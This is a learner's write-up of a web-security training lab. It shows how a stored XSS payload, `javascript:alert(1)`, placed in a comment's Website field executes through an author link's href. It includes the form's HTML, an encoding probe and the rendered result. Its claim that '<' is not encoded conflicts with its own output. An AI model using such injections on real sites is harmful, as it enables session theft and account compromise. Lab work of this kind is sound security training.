#  Lab 8: Stored XSS into anchor href attribute with double quotes HTML-encoded (Apprentice)

---

## 🎯 Mission Description  
This lab contains a stored cross-site scripting vulnerability in the comment functionality, specifically inside the `href` attribute of the author link. The goal is to execute JavaScript when the author’s name is clicked.

---

## 🎯 Mission Objective  
Inject a `javascript:` URL into the `href` attribute so that clicking the author’s name triggers `alert(1)`.

---

## 🧪 Steps (My Approach)

1. 🔍 Opened the "Leave a comment" form and saw fields:
   - **Comment**
   - **Name**
   - **Email**
   - **Website**

   After submitting normal data, the source showed:

   ```html
   <section class="comment">
     <p>
       <img src="/resources/images/avatarDefault.svg" class="avatar">
       <a id="author" href="ahmed.com">ahmed</a> | 10 August 2025
     </p>
     <p>great</p>
     <p></p>
   </section>
````

→ The Website field value is directly inserted into the `href`.

---

2. ❌ First try:
   Submitted special characters `< > / = " '` in the Website field.

   Result:

   ```html
   <a id="author" href="< > / = &quot; '">&lt; &gt; / = &quot; &apos;</a>
   ```

   → Found that `<` and `'` are **not encoded**, but `"` is converted to `&quot;`.

---

3. ✅ Working approach:

   * Since `<` and `'` are not encoded, I can directly use the `javascript:` scheme.
   * Entered `javascript:alert(1)` in the Website field.
   * Now, clicking the author name executes JavaScript.

---

## ✅ Final Payload

```html
javascript:alert(1)
```

🔎 Rendered HTML after injection:

```html
<a id="author" href="javascript:alert(1)">ahmed</a>
```

💥 Clicking the author’s name triggers `alert(1)`.

---

## 🧠 Notes

* Even with double quotes encoded, XSS is still possible if dangerous URL schemes like `javascript:` are allowed.
* Testing with special characters helps reveal encoding patterns and possible injection vectors.

---

## ✅ Status: Solved 🎉
